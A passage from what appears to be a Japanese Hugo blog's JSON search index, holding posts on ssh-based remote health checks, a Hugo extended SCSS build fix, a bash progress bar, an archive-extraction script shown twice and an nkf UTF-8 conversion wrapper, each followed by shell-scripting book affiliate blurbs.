unit=\u0026#34;％\u0026#34;\u0026gt;2.3\u0026lt;/VALUE\u0026gt; \u0026lt;VALUE tab=\u0026#34;17\u0026#34; cat01=\u0026#34;11\u0026#34; time=\u0026#34;1983100000\u0026#34; unit=\u0026#34;％\u0026#34;\u0026gt;2\u0026lt;/VALUE\u0026gt; \u0026lt;VALUE tab=\u0026#34;17\u0026#34; cat01=\u0026#34;11\u0026#34; time=\u0026#34;1984100000\u0026#34; unit=\u0026#34;％\u0026#34;\u0026gt;2.2\u0026lt;/VALUE\u0026gt; \u0026lt;VALUE tab=\u0026#34;17\u0026#34; cat01=\u0026#34;11\u0026#34; time=\u0026#34;1985100000\u0026#34; unit=\u0026#34;％\u0026#34;\u0026gt;1.2\u0026lt;/VALUE\u0026gt; \u0026lt;VALUE tab=\u0026#34;17\u0026#34; cat01=\u0026#34;11\u0026#34; time=\u0026#34;1986100000\u0026#34; unit=\u0026#34;％\u0026#34;\u0026gt;0.1\u0026lt;/VALUE\u0026gt; \u0026lt;VALUE tab=\u0026#34;17\u0026#34; cat01=\u0026#34;11\u0026#34; time=\u0026#34;1987100000\u0026#34; unit=\u0026#34;％\u0026#34;\u0026gt;0.5\u0026lt;/VALUE\u0026gt; \u0026lt;VALUE tab=\u0026#34;17\u0026#34; cat01=\u0026#34;11\u0026#34; time=\u0026#34;1988100000\u0026#34; unit=\u0026#34;％\u0026#34;\u0026gt;0.5\u0026lt;/VALUE\u0026gt; \u0026lt;VALUE tab=\u0026#34;17\u0026#34; cat01=\u0026#34;11\u0026#34; time=\u0026#34;1989100000\u0026#34; unit=\u0026#34;％\u0026#34;\u0026gt;2.5\u0026lt;/VALUE\u0026gt; VALUEが値みたいですがどういう列情報になっているのでしょうか？\nとりあえずAPIはお手軽に叩けることがわかりました。\n次回以降はデータの内容を理解していこうと思います。\n","date":"2021-12-24T18:12:54+09:00","image":"https://suzukiiichiro.github.io/posts/2021-12-23-10-ani/anal_hu68ff39aa0e6aafd68051f9cb2318c17a_134679_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2021-12-23-10-ani/","title":"知識ゼロからのe-Statマイニング"},{"content":"やりたいこと sshでサーバーにログインして、なんらかのコマンドを実行しターミナルに表示、ミッション終了後、ターミナルを自動的にログアウトしてローカルに何事もなかったかのようにもどってくる最も簡単な方法ってなにかないでしょうか。\nイメージ 従来の方法\nローカルＰＣのターミナル ↓ Linuxサーバーにログイン $df $uptime などを実行 ↓ Linuxサーバーをログアウト ローカルＰＣにもどる これからつくるBash/ssh\nローカルＰＣのターミナル ↓ Linuxサーバーにログイン $df $uptime などを実行 Linuxサーバーをログアウト ↓ ローカルＰＣのターミナルにもどる わかりにくいですか？\nまず、メリットとしてサーバーでコマンドからログアウトする必要がありません。\nこれができれば、一台一台サーバーのヘルスチェックをせずとも、数十台のサーバーを\n順番に訪ね歩きファイルに出力する事も可能です。\n以下、ソースです。\n#!/usr/bin/bash ############################################## # sshでサーバーにログインして、なんらかのコマンドを # 実行しターミナルに表示、ミッション終了後、ターミ # ナルを自動的にログアウトしてローカルに何事もなか # ったかのようにもどってくる最も簡単シェルスクリプト ############################################## # # サーバーのＩＰアドレスとか SERVER=\u0026#34;centos@xx.xx.xx.xxx\u0026#34; # 実行したいコマンドを \u0026amp;\u0026amp; でつなぐ COMMAND=\u0026#34;uptime \u0026amp;\u0026amp; df -h\u0026#34;; echo \u0026#34;centosサーバーログイン\u0026#34;; # ポイントは -t です。 ssh $SERVER -t $COMMAND; echo \u0026#34;centosサーバーログアウト\u0026#34;; exit; たったこれだけですが、この工夫により多くのサーバーを\nスクリプトで一括回遊することができます。 お試しあれ。\n書籍の紹介 詳解 シェルスクリプト 大型本 – 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2021-12-24T11:55:21+09:00","image":"https://suzukiiichiro.github.io/posts/2021-12-24-01-suzuki/2021-12-23-bash_hu3f93fa107d6ed2da910fda4d86a52d3c_22108_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2021-12-24-01-suzuki/","title":"【ssh/Bash】sshでログインして実行して自動的に抜けて返ってくる最も簡単な方法"},{"content":"scssやsassを使ってcssを記述すると、CSSを構造化できてサイトのメンテナンス性が格段に上がります。\nGitHub Pagesで公開しているHugoを使ったサイトscss、sassには対応することが可能なので、sassを導入することはメリットがあります。\nところが、Hugoでscssやsassを含んだファイルをGitHubに公開して、Git Actionで自動ビルドしようとした際に見慣れないエラーが表示されました。\nRun hugo --minify Error: Error building site: TOCSS: failed to transform \u0026#34;scss/style.scss\u0026#34; (text/x-scss). Check your Hugo installation; you need the extended version to build SCSS/SASS. : this feature is not available in your current Hugo version, see https://goo.gl/YMrWcn for more information ... Total in 148 ms Error: Process completed with exit code 255. なにか悪いことでもしたのでしょうか。\nそれとも変な記述をしてしまったのだろうかとか思うところです。\nエラーの内容 こういうときは、落ち着いてエラーを見てみましょう。\n大抵のことはちゃんと教えてくれているはずです。\n今回のエラーは下記のような内容になります。\nCheck your Hugo installation; you need the extended version 「Hugoのインストールを確認してください。extendedバージョンが必要です。」と記述されていおります。\nそれではこのエラーに表示されているextendedとは一体何なのでしょうか。\nエラーの対応 さらに落ち着いて設定ファイルを確認していくことにしましょう。\n読み進めていくとどうやらworkflowの設定ファイルにヒントがありそうです。\n.github/workflow/gh-pages.yml\n- name: Setup uses: peaceiris/actions-hugo@v2 with: hugo-version: \u0026#39;0.87.0\u0026#39; #extended: true .github/workflow/の設定ファイル確認したところ、原因がわかりました。\n設定のextendedが思いっきりコメントアウトされていることが原因でした。\n通常のHugoではscss/cssを使用することができません。そうした場合に、Hugo ExtendedをインストールしてHugo自体の機能を拡張してscss/cssを使えるようにするのですが、今回はscssを使っていたにもかかわらず、Hugo Extendedをインストールしていないため発生していたエラーでした。\nコメントを外して、再度Gitにpushしたところ、正常にビルドされて公開できました。\nまとめ scssやsassを含んだファイルをhugoをgitに公開しようとした際に、ビルドできない場合は設定を確認することをオススメします。\nとくに、scssを使用する際はHugo Extendedのインストールが必要と公式にも書いているので、忘れずに設定しましょう。\n","date":"2021-12-24T09:43:41+09:00","image":"https://suzukiiichiro.github.io/posts/2021-12-24-hugo-ywat/af7ef3c0-44c1-4f2f-aad8-1a0664724558_huf3902e4d08fb0294f3a250034e0748e3_207097_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2021-12-24-hugo-ywat/","title":"SCSS/CSSを含んだファイルがGitHubActionsでビルドできない"},{"content":"プログレスバー ターミナルで、処理の進捗が表示されるプログレスバーというのがあります。\n処理が進むにつれて、ジリジリとメーターが右に増えていくあれです。\nシェルスクリプトでも作れないものかとチャレンジしたので参考にして下さい\n使い方 処理のループ中に以下の1行を追記します。\nprogress \u0026#34;$#\u0026#34; \u0026#34;$MAX\u0026#34;; set - \u0026#34;$@\u0026#34; count ; 実行手順 以下のソースコードを適当なファイル名で保存して下さい。ここではProgress.shとします。\n$ :\u0026gt; Progress.sh $ vim Progress.sh # vimで以下のソースコードを貼り付けて保存 # ソースコードのファイルエンコードをUTF-8に変更します。 $ nkf -wLu Progress.sh \u0026gt; Progress.sh.utf8 # ファイルエンコードを変更したファイルを元のファイル名にリネームします。 $ mv Progress.sh.utf8 Progress.sh # 実行権限を付与します $ chmod +x Progress.sh # 実行 $ ./Progress.sh ソースコード #! /bin/bash ####################################### # 進捗を表示するプログレスバー # ####################################### # # # percent $1 # GT $2 progress(){ percent=$1; GT=$2; column=`expr 71 \\* \u0026#34;$percent\u0026#34; / $GT`; nspace=`expr 71 - \u0026#34;$column\u0026#34;`; #プログレスバーのカーソルを左端に戻すリターンコードと[の文字をbarに代入 bar=\u0026#39;\\r[\u0026#39;; #位置パラメータの数($#)を１にリセット（カウンタとして流用） set dummy ; while [ $# -le \u0026#34;$column\u0026#34; ];do bar=$bar\u0026#39;=\u0026#39;; # barに=を追加 set - \u0026#34;$@\u0026#34; dummy; # $#をインクリメント done bar=$bar\u0026#39;\u0026gt;\u0026#39;; #barの先端に\u0026gt;を追加 #位置パラメータの数($#)を１にリセット（カウンタとして流用） set dummy ; while [ $# -le \u0026#34;$nspace\u0026#34; ]; do bar=$bar\u0026#39; \u0026#39;; set - \u0026#34;$@\u0026#34; dummy; done bar=$bar\u0026#39;]\u0026#39;$percent/$GT\u0026#39;\\c\u0026#39;; # barに]と１行分のプログレスバーを表示 echo -e \u0026#34;$bar\u0026#34;; } ####################################### # メイン処理 # set count ; MAX=100 ; #最大値を100とする。実際に掛かる処理数の最大値を入れて下さい。 # for (( i=0; i\u0026lt;$MAX; i++)){ # ループする処理に以下の一行を埋め込めばプログレスバーが表示されます。 progress \u0026#34;$#\u0026#34; \u0026#34;$MAX\u0026#34;; set - \u0026#34;$@\u0026#34; count ; } echo \u0026#34;\u0026#34;; # #終了 exit ; 使い方 シェルスクリプトで自作したなんらかの処理ファイルにprogress()関数を貼り付けます。\n自作ソースの中のループ処理の関数の頭に以下を追記します。\nMAX=100; は、処理の最大値を指定します。\n処理のループ最大数が150回であれば、以下の通りに修正します。\nset count; MAX=150; forやwhileループ処理の中に以下を埋め込みます。\nprogress \u0026#34;$#\u0026#34; \u0026#34;$MAX\u0026#34;; set - \u0026#34;$@\u0026#34; count ; 最後にforまたはwhileループを抜けた後に\necho \u0026#34;\u0026#34;; を追加します。これだけです。\n実行結果 書籍の紹介 詳解 シェルスクリプト 大型本 – 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2021-12-23T16:10:20+09:00","image":"https://suzukiiichiro.github.io/posts/2021-12-23-03-suzuki/2021-12-23-bash_hu3f93fa107d6ed2da910fda4d86a52d3c_22108_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2021-12-23-03-suzuki/","title":"【プログレスバー】Bashでプログレスバーを作ってみようって話"},{"content":"できること 圧縮されているファイルを、ファイルの拡張子にあわせて解凍すると言う作業は、日常的に多いものです。今回は、圧縮ファイルの拡張子を判断して自動的に解凍するシェルスクリプトを作成してみます。\n圧縮ファイルと実行コマンド、パラメータ一覧 拡張子 パラメータ tgz | tar.gz tar zxvf tar.Z gunzip tar.bz2 tar xvfj tar tar xvfz gz gunzip Z gunzip bz2 bunzip2 zip unzip こうしたコマンドやパラメータを覚えておくことは大切ですが、頭の経年劣化とともに、つい思い出すことができず、Googleで検索して調べると言ったことは、往々にしてあることです。\n実行例 # 圧縮ファイルを解凍する便利な unCompコマンド $ unComp comp.tar.gz2 作成 まずファイルを作ります。ファイル名は unComp とします\n# unComp というファイルを作成 $ :\u0026gt; unComp # vim で unComp を開く $ vim unComp unCompファイルに以下の内容を貼り付ける\n#!/bin/bash # #圧縮されているファイルを解凍する # unComp を /usr/local/bin/にコピーすると # 通常のコマンドとして本実行ファイルを利用する事が出来ます。 # # cp unComp /usr/local/bin/unComp # # 実行例 # $ unComp filename(圧縮ファイル) # if [ $# -ne 1 ]; then echo \u0026#34;\u0026#34; exit ; fi # case $1 in *.tgz | *.tar.gz) tar zxvf $1 ;; *.tar.Z) gunzip $1 tar xvf $( echo \u0026#34;$1\u0026#34; | sed \u0026#39;s/\\.Z$//\u0026#39;) ;; *.tar.bz2) tar xvfj $1;; *.tar) tar xvfz $1;; *.gz) gunzip $1;; *.Z) gunzip $1;; *.bz2) bunzip2 $1;; *.zip) unzip $1;; *) echo \u0026#34;ファイルの拡張子が対応していません:$1\u0026#34; esac exit ; 作成したファイルには日本語が含まれているため、unCompファイルを UTF-8に変換しておきます。\nwLuをつかってUTF-8に変換するとさらに便利です。\n# unComp ファイルをnkf -wLu でUTF-8に変換 $ nkf -wLu unComp \u0026gt; unComp.txt # unComp.txtをunCompにリネームします $ mv unComp.txt unComp # 作成したunCompコマンドファイルを/usr/local/bin にコピーします $ sudo unComp /usr/local/bin/ # コマンドが配置されたかを確認 $ which unComp $ /usr/local/bin/unComp 使い方 # 圧縮ファイルの拡張子を気にせずをコマンド一発で解凍する # 実行 $ unComp sample.zip 圧縮ファイルの拡張子に併せたコマンドを思い出したり、さらにはコマンドのパラメータをGoogleで調べたりする必要が減ります。必要に応じて、ソースにコマンドやパラメータを追加すれば、さらに拡張できます。\n便利ですね。\n書籍の紹介 詳解 シェルスクリプト 大型本 – 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2021-12-23T13:11:13+09:00","image":"https://suzukiiichiro.github.io/posts/2021-12-23-02-suzuki/2021-12-23-bash_hu3f93fa107d6ed2da910fda4d86a52d3c_22108_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2021-12-23-02-suzuki/","title":"【unComp】Bashで便利なコマンドを作ってみようって話"},{"content":"できること 圧縮されているファイルを、ファイルの拡張子にあわせて解凍すると言う作業は、日常的に多いものです。今回は、圧縮ファイルの拡張子を判断して自動的に解凍するシェルスクリプトを作成してみます。\n圧縮ファイルと実行コマンド、パラメータ一覧 拡張子 パラメータ tgz | tar.gz tar zxvf tar.Z gunzip tar.bz2 tar xvfj tar tar xvfz gz gunzip Z gunzip bz2 bunzip2 zip unzip こうしたコマンドやパラメータを覚えておくことは大切ですが、頭の経年劣化とともに、つい思い出すことができず、Googleで検索して調べると言ったことは、往々にしてあることです。\n実行例 # 圧縮ファイルを解凍する便利な unCompコマンド $ unComp comp.tar.gz2 作成 まずファイルを作ります。ファイル名は unComp とします\n# unComp というファイルを作成 $ :\u0026gt; unComp # vim で unComp を開く $ vim unComp unCompファイルに以下の内容を貼り付ける\n#!/bin/bash # #圧縮されているファイルを解凍する # unComp を /usr/local/bin/にコピーすると # 通常のコマンドとして本実行ファイルを利用する事が出来ます。 # # cp unComp /usr/local/bin/unComp # # 実行例 # $ unComp filename(圧縮ファイル) # if [ $# -ne 1 ]; then echo \u0026#34;\u0026#34; exit ; fi # case $1 in *.tgz | *.tar.gz) tar zxvf $1 ;; *.tar.Z) gunzip $1 tar xvf $( echo \u0026#34;$1\u0026#34; | sed \u0026#39;s/\\.Z$//\u0026#39;) ;; *.tar.bz2) tar xvfj $1;; *.tar) tar xvfz $1;; *.gz) gunzip $1;; *.Z) gunzip $1;; *.bz2) bunzip2 $1;; *.zip) unzip $1;; *) echo \u0026#34;ファイルの拡張子が対応していません:$1\u0026#34; esac exit ; 作成したファイルには日本語が含まれているため、unCompファイルを UTF-8に変換しておきます。\nwLuをつかってUTF-8に変換するとさらに便利です。\n# unComp ファイルをnkf -wLu でUTF-8に変換 $ nkf -wLu unComp \u0026gt; unComp.txt # unComp.txtをunCompにリネームします $ mv unComp.txt unComp # 作成したunCompコマンドファイルを/usr/local/bin にコピーします $ sudo unComp /usr/local/bin/ # コマンドが配置されたかを確認 $ which unComp $ /usr/local/bin/unComp 使い方 # 圧縮ファイルの拡張子を気にせずをコマンド一発で解凍する # 実行 $ unComp sample.zip 圧縮ファイルの拡張子に併せたコマンドを思い出したり、さらにはコマンドのパラメータをGoogleで調べたりする必要が減ります。必要に応じて、ソースにコマンドやパラメータを追加すれば、さらに拡張できます。\n便利ですね。\n書籍の紹介 詳解 シェルスクリプト 大型本 – 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2021-12-23T13:11:13+09:00","image":"https://suzukiiichiro.github.io/posts/2021-12-25-01-suzuki/2021-12-23-bash_hu3f93fa107d6ed2da910fda4d86a52d3c_22108_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2021-12-25-01-suzuki/","title":"【unComp】Bashで便利なコマンドを作ってみようって話"},{"content":"必要なもの ネットワーク漢字フィルター nkf\n※macの場合、Homebrew が必要になります。\nnkf インストールの手順 まず、nkfがインストールされているかを確認します。\n$ which nkf /usr/local/bin/nkf インストールされていない場合、macの場合はbrewでインストールします。\n$ brew install nkf インストールしようとすると以下のエラーが出ることがあります\nError: The `brew link` step did not complete successfully The formula built, but is not symlinked into /usr/local Could not symlink share/man/ja/man1/nkf.1 /usr/local/share/man/ja/man1 is not writable. 権限周りを下記のコマンドを打って変更します。\nsudo chmod 775 /usr/local/share/man/ja/man1 sudo chown \u0026lt;ユーザ名\u0026gt;:admin /usr/local/share/man/ja/man1 コマンドを確認します。\n$ nkf -v Network Kanji Filter Version 2.1.5 (2018-12-15) Copyright (C) 1987, FUJITSU LTD. (I.Ichikawa). Copyright (C) 1996-2018, The nkf Project. 使い方 nkfコマンドとは？\n「nkf」は「Network Kanji Filter」の略で、LinuxとWindowsなど、異なるOS間でテキストデータを交換する際に問題となる文字コードと改行コードを変換するためのコマンドです。\nnkfコマンドの書式\nnkf オプション ファイル名\nUTF-8に変換する場合は、オプションに wLu をつけて変換します。\n$ nkf -wLu isofile.txt \u0026gt; utf8.txt 変換の流れ（手動編） 元ファイル moto.txt (UTF-8以外のファイルエンコード、改行コード）\n↓\n変換後のファイル ato.txt(UTF-8に変換したファイル）\n↓\n変換後のファイルをリネームする\n# UTF-8に変換 $ nkf -wLu moto.txt \u0026gt; ato.txt # 変換後のファイルを元のファイル名にリネームする $ mv ato.txt moto.txt # vimiでファイルエンコードを確認する $ vim moto.txt 面倒ですね。ここで、一発でUTF-8に変換するコマンドを作成してみます。\n変換の流れ（自動編） # UTF-8に変換 wLu コマンドをこれから自作します $ wLu moto.txt $ vim moto.txt ← UTF-8 に変換されている！ コマンドの内容 まずファイルを作ります。ファイル名は wLu とします\n# wLu というファイルを作成 $ :\u0026gt; wLu # vim で wLu を開く $ vim wLu 以下の内容をファイルに貼り付ける\n#!/bin/bash ################################################# # パラメータで渡されたファイル名をutf8に変換する # # 使い方 # wLu UTF-8に変換したいファイル名 # wLu を /usr/local/bin/にコピーすると # 通常のコマンドとして本実行ファイルを利用する事が出来ます。 # ################################################# # filename=\u0026#34;$1\u0026#34; ; # function wLu(){ if [ -f \u0026#34;$filename\u0026#34; ]; then cat \u0026#34;$filename\u0026#34; | nkf -wLu \u0026gt; \u0026#34;$filename\u0026#34;.u ; mv \u0026#34;$filename\u0026#34;.u \u0026#34;$filename\u0026#34; ; fi } # if ! which nkf \u0026gt;/dev/null 2\u0026gt;\u0026amp;1; then echo \u0026#34;nkf がありません\u0026#34; ; echo \u0026#34;nkf をインストールして下さい\u0026#34; ; exit ; fi # if [ -z \u0026#34;$filename\u0026#34; ] ; then echo \u0026#34;第一引数にファイル名を指定して下さい\u0026#34; echo \u0026#34;実行例： wLu filename\u0026#34; ; exit ; fi # 実行 wLu ; # 終了 exit ; 作成したファイルには日本語が含まれているため、wLuファイルを UTF-8に変換しておきます。\n# wLu ファイルをnkf -wLu でUTF-8に変換 $ nkf 